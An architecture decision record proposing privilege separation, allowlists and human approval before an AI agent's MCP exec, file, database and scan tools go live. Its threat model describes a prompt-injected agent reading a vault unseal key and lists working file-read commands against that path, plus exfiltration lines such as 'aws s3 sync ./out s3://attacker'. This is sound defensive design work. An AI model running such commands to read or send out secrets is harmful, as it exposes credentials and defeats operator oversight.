# ADR-013: Safe Activation of the Data-Plane MCP Tools (exec / db_query / read_file / scan)

**Date**: 2026-06-28
**Status**: Proposed
**Issue**: #14 (depends on Wave-0 guards from #9: ADR-010 egress, ADR-011 policy)
**Branch**: feat/14-executor-wiring

---

## Context

Four MCP data-plane tools ship today but are **inert**: their executors are never
set in `serve()`, so they run with `nil` dependencies and return stub/error text
(`internal/mcp/handler.go` `Set{CommandExecutor,DBExecutor,FileReader,Scanner}`,
`internal/mcp/tools.go` `handleExec`/`handleDBQuery`/`handleReadFile`/`handleScan`).

- `straylight_read_file` -> nil `FileReader` -> "file reader not configured".
- `straylight_scan` -> falls back to an inline `scanner.New()` (already partially live).
- `straylight_db_query` -> nil `DBExecutor` -> "database query is not configured".
- `straylight_exec` -> nil `CommandExecutor` -> `execStubMessage`.

Issue #14 is to **wire** these four executors with their guards. The Wave-0
firewall, egress guard (ADR-010), and policy engine (ADR-011) now exist; wiring
the executors activates those guards on the data plane and makes the Wave-1
keyless/dynamic cloud + database runtime reachable.

The `serve()` NOTE (`cmd/straylight/main.go` ~line 166) is explicit that
`straylight_exec` must NOT be wired until a command allowlist **and filesystem
scoping** land together, because the exec path bypasses the URL-only egress check.

### The hard problem (this ADR is centered on it)

`cmdwrap.Wrapper.Execute` runs the requested command directly via
`exec.CommandContext` (no shell) **inside the container as the straylight user,
UID 10001**. UID 10001 *owns* `<dataDir>/openbao/init.json` (mode 0600), which
contains the OpenBao **unseal key, root token, and AppRole RoleID/SecretID** in
plaintext (`internal/vault/supervisor.go` `initData`, `saveInitFile`,
`defaultInitPath = /data/openbao/init.json`).

Therefore a prompt-injected agent that calls:

```
straylight_exec(service=<any exec-enabled service>, command="cat /data/openbao/init.json")
```

would have the child process — running as the file's owner — read the master
secret and return it (sanitizer-redacted at best, but init.json's base64 unseal
key and hex root token are not in the sanitizer's pattern set, so it returns
verbatim). This **directly violates the THREAT-MODEL §4 invariant**: "The OpenBao
unseal key ... stored in `<data>/openbao/init.json` must be **unreachable by any
MCP tool path**." If the model can read the unseal key, the entire zero-knowledge
claim fails (§4, §3.2.4).

The egress pre-flight (`checkEgressPreflight`) does not help: it only inspects
argv tokens that parse as `http(s)://` URLs. `cat`, `dd`, `xxd`, `python -c`,
shell redirection, base64 piping — none expose a URL, so the read is not even
seen by the guard. The threat is **local file disclosure**, not egress.

### Why a command DENYLIST does not hold

A denylist of "dangerous" binaries (`cat`, `dd`, `xxd`, `od`, `head`, `tail`,
`base64`, ...) is trivially bypassable in a container that has a shell and
interpreters on PATH:

- `python3 -c "print(open('/data/openbao/init.json').read())"`
- `perl -ne 'print' /data/openbao/init.json`
- `awk '{print}' /data/openbao/init.json`
- `dd if=/data/openbao/init.json` / `tr ... < /data/openbao/init.json`
- `grep -a . /data/openbao/init.json` / `sed '' /data/openbao/init.json`
- `sort /data/openbao/init.json`, `tac`, `nl`, `strings`, `xxd`, `hexdump`, `cmp`, `wc -L`
- any new binary the agent installs/builds, or any future tool that opens files

The set of programs that can read a file the calling uid owns is effectively
"all of them." A denylist enumerates badness and always loses. The correct
control must remove the **capability to read that file at all**, not enumerate
the ways to read it.

### Constraints

- **Single-container model**: one Alpine container, OpenBao as a child process,
  read-only root FS, `cap_drop: ALL`, non-root UID 10001 (`deploy/Dockerfile`,
  `deploy/docker-compose.yml`). No sidecar, no second container in v1.
- **`cap_drop: ALL` removes CAP_SETUID/CAP_SETGID** — the running process cannot
  arbitrarily `setuid()` to a different uid at runtime, and cannot mount/chroot
  without CAP_SYS_ADMIN/CAP_SYS_CHROOT. This rules out several "obvious" answers
  (see options).
- **Vault needs init.json**: the supervisor reads it on every restart to unseal
  and re-auth (`resumeFromInitFile`). The supervisor runs as UID 10001 too.
- **Match repo idioms**: consumer-declared interfaces, data-driven per-service
  config, one guard/engine constructed in `serve()` and injected, audit on deny.
- **Pragmatic + incremental**: lower-risk tools first; exec last, behind the
  strongest guards and per-service opt-in.
- **Design only**: this ADR proposes; no Go files are touched here. Any
  Dockerfile/runtime change is flagged for maintainer confirmation.

---

## Decision Drivers

- **Security** (primary): the `cat init.json` exfil must be *structurally*
  impossible on the exec path, not denylisted.
- **Threat-model fidelity**: uphold §4 invariant; honest residual-risk section.
- **Single-container feasibility**: holds under `cap_drop: ALL` + read-only root.
- **Incremental rollout**: do not gate the safe tools (read_file/scan/db_query)
  on the hardest control (exec privilege separation).
- **Maintenance / deploy cost**: prefer a runtime change the maintainer can
  reason about (a second uid + a chgrp) over kernel-feature-dependent isolation.

---

## Part A — SAFE-EXEC: options analysis and recommendation

The question for each option: **does it make `cat /data/openbao/init.json`
return "permission denied" regardless of which binary the agent chooses?**

### Option A1: Relocate the unseal material off any exec-reachable path

Move `init.json` out of `/data` to a path the exec child cannot reach, and/or
change *who owns it* so UID 10001 (and therefore the exec child) cannot read it.

Three sub-variants:

- **A1a — different directory, same uid**: move to `/run/straylight/init.json`
  (tmpfs) or `/etc/straylight/init.json`. **Fails**: the file is still owned by
  10001 and readable by `cat /etc/straylight/init.json`. Relocation alone does
  nothing while the exec child shares the owner uid. (It also breaks persistence
  across restarts if put on tmpfs — the supervisor re-inits every boot, losing
  the encrypted store's matching key.)
- **A1b — owned by a different uid, readable only by the supervisor**: store
  init.json as `root:root 0600` (or `uid=0`), and have the *supervisor* read it
  as root while the *server + exec children* run as 10001. **Fails in this
  architecture**: the supervisor and the MCP server are the **same process**
  (`serve()` starts the supervisor and the HTTP server in one binary). There is
  no privilege split to exploit; the one process must be able to read init.json
  to unseal, so any exec child it spawns inherits that ability unless the child
  drops to a *lower* uid (that is Option A2).
- **A1c — never persist the unseal key to a file at all**: derive/seal with an
  OS keychain, KMS, or operator-supplied env at boot (THREAT-MODEL §4 "production
  ... OS keychain or out-of-band file"). **Strong but out of scope for the
  single-container OSS default**: there is no keychain in a scratch Alpine
  container; KMS auto-unseal is a Wave-3+ enterprise path. Worth a roadmap ADR,
  not this one.

**Verdict**: relocation by itself is insufficient (A1a/A1b) given the
single-process design; A1c is a different, larger initiative. Relocation is kept
only as a *defense-in-depth companion* to the chosen option (move the openbao dir
under a dedicated path and make it group-unreadable), not the primary control.

### Option A2: Privilege separation — run exec children as a lower-privileged uid (RECOMMENDED)

Spawn every `straylight_exec` child process as a **distinct, lower-privileged
uid/gid** (proposed `UID 10101 / GID 10101`, name `straylight-exec`) that has
**no read access** to `<dataDir>/openbao`. The main process keeps UID 10001 (it
must, to read init.json and unseal). The child is dropped to 10101 via
`SysProcAttr{Credential: &syscall.Credential{Uid: 10101, Gid: 10101}}` on the
`exec.Cmd`.

Make init.json unreadable to 10101:

- init.json stays `straylight:straylight 0600` (owner 10001 r/w, group none,
  other none). 10101 is neither owner nor group -> **other** -> no read bit.
- The containing dir `<dataDir>/openbao` is `straylight:straylight 0700` (already
  created `0o700` by `saveInitFile`/`ensureConfig`) -> 10101 cannot even
  traverse/list it. `cat /data/openbao/init.json` => `permission denied` for
  every binary the agent picks, because the **kernel** denies the open(2) by uid,
  not by program name.

This is the only option that turns the exfil into an OS-enforced "permission
denied" while staying in a single container.

**The `cap_drop: ALL` wrinkle (must be resolved — flagged for maintainer)**:
dropping a child to a different uid via `SysProcAttr.Credential` requires
**CAP_SETUID + CAP_SETGID** in the parent process. `docker-compose.yml` currently
`cap_drop: ALL`, which removes them. So this option requires **adding those two
capabilities back**:

```yaml
# deploy/docker-compose.yml (proposed)
cap_drop:
  - ALL
cap_add:
  - SETUID
  - SETGID
```

This is a deliberate, scoped trade: we add exactly the two capabilities needed to
*drop* privilege for children, in service of preventing the unseal-key read. Net
posture is **stronger**, not weaker — without it, exec children run as the
vault-owning uid. The Dockerfile keeps `USER straylight` (10001); it pre-creates
the `straylight-exec` (10101) user/group so the runtime uid exists. (Pre-creating
a uid is not required by the kernel for setuid-by-number, but having a named
account keeps `ps`, audit, and `/etc/passwd` lookups sane.)

**Filesystem reachability for the child (read_file/exec disjoint roots)**: the
exec child still needs to do useful work in the user's project, but must not see
`/data/openbao`. Two enforcement layers:

1. **uid permission** (above) — the hard, kernel-enforced boundary on the openbao
   dir. This is sufficient on its own to stop the init.json read.
2. **cwd + PATH scoping** (defense in depth) — run the child with `Dir` set to the
   configured project root (the same root the firewall already enforces for
   read_file) and a minimal PATH, so the *default* working surface is the project,
   not `/data`.

**Pros**
- Kernel-enforced: `permission denied` for *all* read methods (cat, python, dd,
  new binaries) — defeats the denylist-bypass class entirely.
- Stays single-container; no sidecar, no kernel-feature dependency (no namespaces
  required, works on any Linux that supports setuid — i.e. all of them).
- Composes with the allowlist, egress, and policy gates (all still apply).
- Small, auditable runtime delta (two caps + one extra uid + a dir-perm assertion).

**Cons**
- Requires the `cap_add: [SETUID, SETGID]` deploy change (flagged).
- 10101 must still be able to read the *project* files the user wants exec to
  touch; if the project root is owned 10001:10001 0700, the child (10101) can't
  read it. Mitigation: the project bind-mount / data should be group-readable by a
  shared `straylight` group, or the project root made `o+rx` for non-secret code;
  **the openbao dir is the one place that must remain 10101-unreadable.** This is
  a documented deployment requirement (Part E hardening checklist).
- Native (non-container) `straylight serve` run by a normal user cannot setuid to
  10101. Mitigation: if the configured exec uid is unset or equals the current
  uid, fall back to "same-uid exec is refused unless `STRAYLIGHT_ALLOW_SAMEUID_EXEC=1`"
  — i.e. native dev must explicitly opt into the weaker mode, and the default
  container path is always privilege-separated.

### Option A3: Filesystem isolation via mount namespace / chroot / bind-mount hiding

Unshare a mount namespace for the child and bind-mount an empty dir over
`/data/openbao` (or chroot the child into the project root) so the path is simply
absent.

**Pros**: very strong — the path does not exist for the child.
**Cons**: requires **CAP_SYS_ADMIN** (for `unshare(CLONE_NEWNS)` / `mount`) or
CAP_SYS_CHROOT — re-adding CAP_SYS_ADMIN to a container is a *large* privilege
grant (far broader than SETUID/SETGID) and is exactly what container hardening
guides say to never do. User namespaces (`CLONE_NEWUSER`) could avoid the cap but
are frequently disabled in hardened/k8s environments and add significant
complexity and portability risk. **Rejected for v1** as disproportionate and
deployment-fragile; reconsider only if a future need (e.g. full FS jailing for
arbitrary build tooling) justifies it. Option A2 achieves the specific goal
(init.json unreadable) at a fraction of the privilege and complexity.

### Option A4: Strict command ALLOWLIST + argument validation (necessary, not sufficient)

`cmdwrap` already supports `AllowedCommands` (binary-name allowlist) and
`reservedEnvVars`. Make the allowlist **mandatory and non-empty per service**
(empty == deny-all for exec), and add argument validation (reject absolute paths
into `/data`, reject `..`, reject shell-interpreter binaries `sh/bash/python/perl/
awk/ruby/node` unless explicitly allowed).

**Pros**: drastically shrinks the surface; pairs naturally with per-service
opt-in; cheap; already half-built.
**Cons**: an allowlisted-but-flexible binary still reads files. If `aws` is
allowed, `aws s3 cp /data/openbao/init.json s3://...` reads it as 10001 (without
A2). If `git` is allowed, `git hash-object -w /data/openbao/init.json` then a
push leaks it. So the allowlist **bounds** but does not **prevent** the read while
the child runs as the owner uid. **Necessary defense-in-depth, insufficient
alone.** It is adopted *in addition to* A2.

### Option A5: Mandatory human-in-the-loop approval tier for exec (adopted, complementary)

Gate `straylight_exec` (and other high-impact actions) behind an out-of-band
approval the operator must grant before the command runs. THREAT-MODEL §6 lists
"Human approval tiers for high-impact actions" as a roadmap control; this ADR
brings a **minimal synchronous v1** into scope for exec only.

**Pros**: a human sees the exact argv before any credential-bearing command runs;
catches novel exfil attempts the allowlist/uid split don't anticipate.
**Cons**: friction; not a substitute for the structural control (a human may
approve a benign-looking `aws s3 sync ./out s3://bucket` that an injection
retargeted). **Adopted as a gate layer, not the boundary.**

### Recommendation (Part A)

**Adopt A2 (privilege-separated exec child at UID/GID 10101) as the structural
control**, composed with **A4 (mandatory per-service allowlist + arg validation)**,
the existing **ADR-010 egress pre-flight**, the **ADR-011 policy gate**, **A5
(human approval tier for exec)**, and **A1 as defense-in-depth** (keep the openbao
dir `0700` owned by 10001 and unreadable by 10101; optionally relocate under a
dedicated `<dataDir>/.vault/` to make the boundary obvious).

**What actually prevents `cat /data/openbao/init.json`**: the child runs as 10101;
init.json is `10001:10001 0600` inside a `0700` dir; the kernel returns
`permission denied` on `open(2)` for *every* program 10101 invokes. No binary
choice, interpreter, or redirection bypasses a uid-based file permission. The
allowlist/policy/approval layers reduce the surface and add oversight on top of
that hard boundary.

**Required runtime/Dockerfile changes (flagged for maintainer confirmation)**:

1. `deploy/docker-compose.yml`: `cap_add: [SETUID, SETGID]` alongside
   `cap_drop: ALL`. (Required for the child uid drop.)
2. `deploy/Dockerfile`: create a second account
   `addgroup -g 10101 -S straylight-exec && adduser -u 10101 -S straylight-exec -G straylight-exec`.
   Keep `USER straylight` (10001) as the process uid. Optionally `chmod 0700` the
   openbao subdir at first run (already `0o700` in code; assert it).
3. Document the deployment requirement: the openbao data subdir MUST remain
   unreadable by uid 10101 (owner-only `0700`); project files exec needs MUST be
   readable by 10101 (shared group or `o+rx` on non-secret code).

Without change (1), the safe path is **do not wire exec at all** (keep the
stub) and ship read_file/scan/db_query only (Part D, Phase 1-2). Exec wiring
(Phase 3) is contingent on the maintainer accepting the two-capability + second-uid
runtime delta.

---

## Part B — Wiring all four executors in `serve()`

All wiring goes in the component-graph section of `newServeCmd().RunE`
(`cmd/straylight/main.go`, after the `eng := policy.New()` / `mcpHandler.SetPolicy`
block, replacing the NOTE that keeps exec unwired). One `guard` and one `eng`
already exist and are reused.

### B.1 read_file -> firewall (Phase 1)

```go
fw := firewall.NewFirewall(firewall.FirewallConfig{
    ProjectRoot: cfg.ProjectRoot,                     // restrict reads to the project root
    BlockedDirs: []string{filepath.Join(dataDir, "openbao")}, // §4 invariant: vault dir blocked
    // BlockedPatterns / StructuredKeyPatterns default (already block init.json by name)
})
mcpHandler.SetFileReader(fw)
```

- `BlockedDirs` is exactly the firewall field that exists for this
  (`internal/firewall/firewall.go`); pass `<dataDir>/openbao` so the whole subtree
  is blocked even against symlink/`..` traversal (`checkBlockedDir` resolves
  symlinks). `init.json` is also blocked by name via `DefaultConfig`.
- `ProjectRoot` must be a real configured value; `handleReadFile` already refuses
  when `FileReader` is nil, so wiring a rootless firewall would be a regression —
  set the root from config/dashboard (see Part C schema note).

### B.2 scan -> scanner (Phase 1)

```go
sc := scanner.New()
mcpHandler.SetScanner(sc)
```

- `handleScan` already rejects absolute paths and `..` traversal and defaults to
  `.`; injecting the shared instance is cosmetic but removes the per-call
  `scanner.New()` and lets us add a future BlockedDirs-aware scan root.
- Lowest risk: read-only, no credentials, output is redacted findings.

### B.3 db_query -> database.Manager (Phase 2)

```go
dbMgr := database.NewManager(vaultClient) // dynamic creds via OpenBao database engine
defer dbMgr.Close()
// configured databases are registered from config/dashboard via dbMgr.ConfigureDatabase(...)
mcpHandler.SetDBExecutor(dbMgr)
```

- `*database.Manager` already satisfies `mcp.DBExecutor`
  (`GetCredentials`/`GetDatabaseConfig`/`ListDatabases`). The Wave-1 keyless/
  dynamic path is intrinsic: creds are short-lived OpenBao leases, read-only
  (`SELECT`) by default, never returned to the AI.
- The ADR-011 policy gate already runs in `dispatchToolCall` for any tool with a
  `service` arg, so db_query is policy-gated for free (gate db services to
  read-only-intent). Egress to the DB host is covered if the DB is reached over
  the proxy dialer; direct `sql.Open` in `handleDBQuery` is *not* egress-gated —
  see residual risk R5 and tech-debt TD-2.
- `RevokeAll()` on shutdown to invalidate temp users (add to the defer chain).

### B.4 exec -> cmdwrap (Phase 3, behind the strongest guards)

```go
// Only construct/ wire when the runtime supports privilege separation
// (container with cap_add SETUID/SETGID) OR explicit same-uid opt-in (native dev).
execUID, execGID := resolveExecCreds() // 10101/10101 in container; refuses same-uid unless opted in
wrapper := cmdwrap.NewWrapperWithGuard(registry, san, guard) // reuse the ADR-010 guard
wrapper.SetChildCredential(execUID, execGID)                 // NEW seam (Part C)
wrapper.SetApprover(approver)                                // NEW seam (Part E / A5)
mcpHandler.SetCommandExecutor(wrapper)
```

- `registry` already satisfies `cmdwrap.CredentialResolver` (`GetCredential`/`Get`).
- The wrapper reuses the same `guard` as the proxy (egress pre-flight on URL args).
- `SetChildCredential` is the new privilege-separation seam (Part C); without it
  the wrapper must **refuse to run** (fail-closed) rather than run as 10001.
- The policy gate in `dispatchToolCall` already evaluates `straylight_exec` by
  tool+service; exec also requires the per-service `AllowedCommands` to be
  non-empty (Part C: deny-all-by-default for exec).

Net `serve()` change: delete the NOTE, add the five `Set*` calls (gated by phase
flags / config), and the two defers (`dbMgr.Close`, `dbMgr.RevokeAll`).

---

## Part C — Config / Service schema additions

Reuse the existing per-service config conventions (`Egress`, `Policy`,
`ExecConfig.AllowedCommands` already exist). Add the minimum new fields:

### C.1 Service (`internal/services/registry.go`)

- **No new persisted field is strictly required for the uid split** — the exec uid
  is a *runtime/deploy* property, not a per-service one. It is resolved once in
  `serve()` (env `STRAYLIGHT_EXEC_UID`/`GID`, default 10101).
- Reuse existing `Service.ExecEnabled` as the **per-service opt-in** for exec
  (already present, drives the `serviceCapabilities` "exec" cap). Exec is wired
  globally but **refused per service unless `ExecEnabled == true`** AND the
  service has a non-empty allowlist.
- Optional new field for clarity: `ExecPolicy *ExecPolicy` carrying
  `AllowedCommands []string` and `RequireApproval bool` (mirrors `ToolPolicy` /
  `EgressPolicy` persistence via `saveMetadata`/`LoadFromVault` JSON-string
  convention). If we prefer zero new fields, fold `AllowedCommands` from the
  existing `config.ExecConfig` and add only `RequireApproval` to `Service`.

### C.2 cmdwrap.Wrapper new seams (`internal/cmdwrap/wrapper.go`)

```go
// SetChildCredential makes Execute spawn the child with the given uid/gid via
// SysProcAttr.Credential. When unset, Execute fails closed (refuses to run as
// the parent/vault-owning uid) unless same-uid exec is explicitly opted in.
func (w *Wrapper) SetChildCredential(uid, gid uint32)

// SetApprover wires the human-in-the-loop approval gate (A5). When set and the
// service/command requires approval, Execute blocks on Approver.Await(ctx, req)
// and runs only on an explicit approve.
func (w *Wrapper) SetApprover(a Approver)
```

`Approver` is a consumer-declared interface (mirrors the repo idiom):

```go
type Approver interface {
    // Await blocks until a human approves/denies the exec request or ctx expires.
    // Returns nil to allow, a non-nil error to deny (reason is audited, never creds).
    Await(ctx context.Context, req ApprovalRequest) error
}
type ApprovalRequest struct {
    Service string
    Argv    []string // the parsed command (no env / no creds)
    Tool    string
}
```

In `Execute`, after allowlist + egress pre-flight and **before** building the
`exec.Cmd`, add (a) the approval await, then set
`cmd.SysProcAttr = &syscall.SysProcAttr{Credential: &syscall.Credential{Uid: w.uid, Gid: w.gid, NoSetGroups: true}}`
and `cmd.Dir = projectRoot`. Make `AllowedCommands` mandatory for exec services
(empty -> deny). Add interpreter binaries to a default deny inside the allowlist
check unless explicitly allowed.

### C.3 config.yaml (illustrative)

```yaml
project_root: /workspace          # firewall + exec cwd root (read_file / exec scope)
services:
  aws-deploy:
    type: cloud
    exec_enabled: true            # per-service opt-in for exec (Phase 3)
    exec_config:
      env_var: AWS_SHARED_CREDENTIALS_FILE   # creds injected via env, never argv
      allowed_commands: [aws]                # MANDATORY, non-empty; deny-all if missing
    policy:
      allowed_methods: [GET]      # db/api gate still applies
    egress:
      allow_hosts: [sts.amazonaws.com, s3.us-east-1.amazonaws.com]
    exec_require_approval: true   # A5 human-in-the-loop for this service
```

---

## Part D — Phased activation plan

Turn on lowest-risk tools first; gate exec behind the strongest guards last.

| Phase | Tools wired | Guards required | Runtime change | Risk |
|-------|-------------|-----------------|----------------|------|
| **1** | `read_file`, `scan` | firewall `BlockedDirs=<dataDir>/openbao` + `ProjectRoot`; scan path checks (already present) | none | Low — read-only, redacted, vault dir blocked |
| **2** | `db_query` | ADR-011 policy gate (already in dispatch); read-only dynamic creds (default); lease revoke on shutdown | none | Medium — bounded by read-only SQL + short leases + policy |
| **3** | `exec` | A2 uid split (10101) + A4 mandatory allowlist + arg validation + ADR-010 egress + ADR-011 policy + A5 approval; per-service `ExecEnabled` opt-in | **cap_add SETUID,SETGID + second uid (Dockerfile)** | Highest — gated last; structural init.json boundary + oversight |

- Phase 1 and 2 ship **without any Dockerfile/runtime change** and activate the
  Wave-0 firewall + policy guards on the data plane immediately.
- Phase 3 is **contingent** on the maintainer accepting the runtime delta. Until
  accepted, `straylight_exec` keeps returning the stub (the wrapper refuses to run
  without `SetChildCredential`), so partial activation is safe and shippable.
- Each phase is independently revertible (omit the corresponding `Set*` call).

---

## Part E — Policy engine + egress + approval-tier integration

- **Policy (ADR-011)**: already evaluated in `dispatchToolCall` for every tool
  carrying a `service` arg (the gate runs before any handler). db_query, exec, and
  api_call are gated uniformly. No change needed beyond wiring the executors; for
  exec, populate `policy.Request{Tool: "straylight_exec", Service, Method: "", Path: ""}`
  (already the v1 behavior). Recommend per-service policies for db services
  (deny non-read intent) and exec services (host pin via egress).
- **Egress (ADR-010)**: the proxy dialer is authoritative on api_call; the
  cmdwrap egress pre-flight (URL-arg host check) applies to exec. db_query's
  direct `sql.Open` is **not** dialer-gated today (residual R5 / TD-2): mitigate
  by pinning DB host via per-service egress and treating it as best-effort until
  the DB connection routes through a guarded dialer.
- **Human-in-the-loop (A5) — which actions require approval**:
  - **REQUIRED**: every `straylight_exec` call for a service with
    `exec_require_approval: true` (recommend default true for any cloud/infra
    service). The operator sees the exact argv (no env, no creds) and approves or
    denies; denial is audited.
  - **RECOMMENDED**: `straylight_db_query` with a non-read-only intent (writes) —
    out of scope for v1 since default creds are read-only; revisit if write roles
    are enabled.
  - **NOT required**: `read_file`, `scan` (read-only, redacted) and read-only
    `api_call` GETs — approval here would be pure friction.
  - Audit: reuse `audit.EventPolicyDenied` patterns; add an exec-approval
    decision to the audit trail (approve/deny + argv hash, never creds). A new
    `audit.EventType` (e.g. `exec_approval`) can be added next to the existing
    constants if a distinct type is wanted.

---

## Consequences

**Positive**
- The init.json exfil becomes an OS-enforced `permission denied` on the exec path
  — denylist-bypass class eliminated, §4 invariant upheld by the kernel.
- Wave-0 firewall + policy + egress guards become *live* on the data plane.
- Lower-risk tools ship immediately with zero runtime change; exec is opt-in,
  gated, and revertible.
- All four executors wired via the existing consumer-interface idiom; minimal new
  surface (two cmdwrap seams, one optional Service field).

**Negative**
- Exec requires re-adding two capabilities (SETUID, SETGID) and a second uid —
  a deploy change the maintainer must accept.
- 10101 must be able to read project files but not the openbao dir; this is a
  documented deployment requirement (group/perm setup), an operability cost.
- db_query's direct DB connection is not dialer-egress-gated in v1 (tech debt).

**Risks + mitigations**
- *Misconfigured perms let 10101 read openbao* -> startup self-check: assert the
  openbao dir is `0700` owned by the process uid and NOT readable by the exec uid;
  refuse to wire exec (fail-closed) if the assertion fails.
- *Native run can't setuid* -> default-refuse same-uid exec; require explicit
  `STRAYLIGHT_ALLOW_SAMEUID_EXEC=1` for dev, with a loud warning.
- *New tool added without a policy gate* -> the gate is the single
  `dispatchToolCall` choke point (ADR-011 mitigation carries over); a test
  asserts every credential-bearing tool resolves a policy.
- *Approval fatigue -> rubber-stamping* -> keep approval scoped to exec on
  high-impact services; show full argv; keep read-only tools approval-free.

**Tech Debt**
- **TD-1**: exec child socket-level egress still unmediated (ADR-010 residual);
  container nft/eBPF egress is the paydown (issue #9 follow-on). The uid split
  does *not* fix CamoLeak-style exfil through an allowed host.
- **TD-2**: `handleDBQuery` opens DB connections via `sql.Open` directly, bypassing
  the guarded dialer; route DB connections through an egress-checked dialer in a
  follow-up.
- **TD-3**: A1c (no on-disk unseal key; KMS/keychain auto-unseal) remains the
  stronger long-term answer for the §4 invariant; track as a Wave-3 ADR.

---

## Part F — Residual risk (honest, consistent with THREAT-MODEL)

This design closes the *specific* init.json-via-exec hole; it does **not** make
exec or the data plane safe in general. Per THREAT-MODEL §2/§3.2/§5:

1. **Confused-deputy misuse remains** (§3.2.2, §5.3). A prompt-injected agent can
   still run any *allowed* command with injected creds — `aws s3 sync ./out
   s3://attacker` if `aws` is allowlisted and the dest is egress-allowed. The uid
   split protects init.json, not the legitimate authority the credential grants.
2. **Exec child sockets are unmediated** (§3.2.5, ADR-010). The egress pre-flight
   only sees URL-shaped argv; env-driven endpoints, config files, and follow-on
   connections are not checked. nft/eBPF egress is the tracked paydown.
3. **CamoLeak through an approved host** (§5.1). Narrow allowlists reduce but do
   not remove exfil through a permitted destination.
4. **Other files 10101 *can* read** are still readable via exec/read_file within
   the project root — by design (that is the tool's purpose); only the openbao dir
   and blocked patterns are protected. Secrets the user leaves in the project are
   the scanner's/firewall's job, which miss 12-48% (§3.2.3).
5. **db_query DB connection not egress-gated** (TD-2) — a DB host could in
   principle be redirected; mitigate with per-service egress + DB host pinning.
6. **No API auth** (§3.2.4) — any localhost process can call `/api/v1/mcp/*` and
   thus exec/db_query/read_file. The trust boundary is localhost binding, not
   per-request auth; unchanged by this ADR.
7. **Native same-uid exec opt-in** re-opens the init.json read for that
   dev-only mode by design; it is loud, off by default, and never the container
   default.
8. **A1c not adopted**: the unseal key still lives on disk (encrypted store key in
   plaintext init.json), readable by the process uid (10001). A container escape
   or volume misconfig still exposes it (§3.2.4) — out of scope here.

The defensible claim is unchanged (§7): the credential *value* stays out of the
AI context; misuse of authority is **scoped, bounded, and auditable** — and now
the single most catastrophic local read (the unseal key) is structurally blocked
on the exec path.

---

## Part G — Test plan

**`internal/firewall` (Phase 1)**
- `read_file` of `<dataDir>/openbao/init.json` -> blocked (by name AND by
  `BlockedDirs`); symlink `<root>/link -> /data/openbao` -> blocked (EvalSymlinks
  resolves before prefix check); `..` traversal out of `ProjectRoot` -> denied.
- Non-secret project file -> read with redaction; structured-key redaction intact.

**`internal/cmdwrap` (Phase 3) — the load-bearing tests**
- **Privilege drop**: with `SetChildCredential(10101,10101)`, the child runs as
  10101 (assert via `id -u` in the child / `os.Geteuid()` in a test helper on
  Linux CI). Skip-or-root-guard on platforms without setuid.
- **The exfil is denied**: child (10101) attempting to read a `0600` file owned by
  the test's parent uid in a `0700` dir returns a non-zero exit + "permission
  denied" — assert for `cat`, `dd`, and `python -c open(...)` (denylist-bypass
  proof) all fail identically.
- **Fail-closed**: wrapper with no `SetChildCredential` and no same-uid opt-in ->
  `Execute` returns an error and spawns nothing.
- **Mandatory allowlist**: exec for a service with empty `AllowedCommands` ->
  denied before spawn.
- **Approval gate**: `SetApprover` that denies -> command never runs, deny audited;
  approver that approves -> runs; ctx cancel during await -> denied.
- Existing wrapper tests (env minimalism, reservedEnvVars, sanitization, timeout,
  egress pre-flight) continue to pass.

**`internal/mcp` (wiring/dispatch)**
- With all four executors set, each tool dispatches to its real handler (no stub).
- `straylight_exec` for a service with `ExecEnabled=false` -> denied.
- Policy deny on a db service -> `db_query` blocked before creds fetched
  (recording DBExecutor proves `GetCredentials` not reached).
- Audit: exec-approval and policy/egress denials emitted without creds.

**`serve()` / integration (smoke)**
- Startup self-check refuses to wire exec when the openbao dir is readable by the
  exec uid (simulate by chmod) — fail-closed.
- End-to-end: read_file/scan/db_query work in Phase 1-2 with `cap_drop: ALL`
  unchanged; exec works only with `cap_add: [SETUID, SETGID]` and the second uid.

---

## Validation Criteria

- A privilege-separated exec child receives `permission denied` for *every* read
  method against `<dataDir>/openbao/init.json` (cat/dd/python proven in CI).
- `read_file` of the openbao subtree is blocked by name and by `BlockedDirs`,
  including via symlink and `..`.
- No credential-bearing tool bypasses the ADR-011 dispatch gate.
- Phase 1-2 ship with the existing `cap_drop: ALL` posture unchanged.
- Reconsider when: kernel egress (nft/eBPF) lands (revisit TD-1/exec residual),
  or KMS/keychain auto-unseal lands (revisit A1c / TD-3), or write-capable DB
  roles are introduced (extend approval tier to db writes).

---

## Maintainer confirmation needed (before implementation)

1. **Accept the exec runtime delta?** `cap_add: [SETUID, SETGID]` in
   `docker-compose.yml` + a second uid (`straylight-exec` 10101) in the
   `Dockerfile`, in exchange for kernel-enforced protection of init.json on the
   exec path. **If no**: ship Phases 1-2 only; keep `straylight_exec` stubbed.
2. **Exec opt-in default**: confirm `ExecEnabled` (per-service, default false) is
   the desired gate, plus mandatory non-empty `allowed_commands`.
3. **Approval tier scope**: confirm exec-on-high-impact-services requires human
   approval by default (and read-only tools do not).
